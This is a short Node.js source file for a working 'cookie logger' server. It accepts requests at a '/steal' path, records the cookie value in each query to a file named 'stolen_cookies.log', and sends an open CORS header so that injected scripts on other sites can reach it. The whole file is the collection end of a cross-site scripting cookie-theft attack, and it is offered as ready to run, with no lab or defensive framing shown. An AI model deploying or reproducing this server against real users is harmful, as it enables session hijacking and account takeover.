const http = require('http');
const fs = require('fs');
const path = require('path');

function startServer(port) {
    const server = http.createServer((req, res) => {
        console.log('Received request:', req.url); // Debug log
        
        if (req.url.startsWith('/steal?')) {
            const url = new URL(req.url, `http://localhost:${port}`);
            const cookie = url.searchParams.get('cookie');
            
            console.log('Stolen cookie:', cookie); // Debug log
            
            // Ensure the log file exists
            const logFile = 'stolen_cookies.log';
            const timestamp = new Date().toISOString();
            const logEntry = `[${timestamp}] Stolen Cookie: ${cookie}\n`;
            
            // Write to file synchronously to ensure it's written
            try {
                fs.appendFileSync(logFile, logEntry);
                console.log('Cookie written to', logFile);
            } catch (err) {
                console.error('Error writing to log file:', err);
            }

            res.writeHead(200, { 
                'Content-Type': 'text/plain',
                'Access-Control-Allow-Origin': '*' // Add CORS headers
            });
            res.end('Cookie received and logged');
        } else {
            res.writeHead(404);
            res.end('Not found');
        }
    });

    server.on('error', (err) => {
        if (err.code === 'EADDRINUSE') {
            console.log(`Port ${port} is in use, trying port ${port + 1}`);
            startServer(port + 1);
        } else {
            console.error('Server error:', err);
        }
    });

    server.listen(port, () => {
        console.log(`Cookie logger server running at http://localhost:${port}`);
    });
}

// Start with port 8000
startServer(8000); 